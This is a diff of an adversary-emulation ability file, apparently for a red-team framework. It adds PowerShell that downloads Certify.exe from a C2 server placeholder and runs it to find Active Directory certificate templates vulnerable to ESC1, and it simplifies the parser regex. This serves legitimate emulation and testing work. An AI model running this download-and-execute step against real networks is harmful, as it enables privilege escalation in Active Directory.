@@ -8,14 +8,13 @@
   platforms:
     windows:
       psh:
-        payloads:
-          - Certify.exe
         command: |
+          cd "C:\Users\Public";
+          Invoke-WebRequest -Uri "#{server}/file/download" -Method POST -Headers @{"file" = "Certify.exe"} -OutFile "Certify.exe";
           .\Certify.exe find /vulnerable
         parsers:
           plugins.adversary_emulation.app.parsers.regex_parser:
             - source: 'esc1.template'
               custom_parser_vals:
-                # Match if block contains all 3 key indicators, extract the template name
-                regex: '(?s)Template Name\s+:\s+([^\r\n]+).*?ENROLLEE_SUPPLIES_SUBJECT.*?(Client Authentication).*?(Enrollment Rights\s+:\s+NT AUTHORITY\\Authenticated Users|Enrollment Rights\s+:\s+#{domain.name}\\\\Domain Users)'
+                regex: '(?s)\[!\] Vulnerable Certificates Templates :.*?Template Name\s+:\s+([\S]+)'
                 edge_label: 'is_esc1_vulnerable'
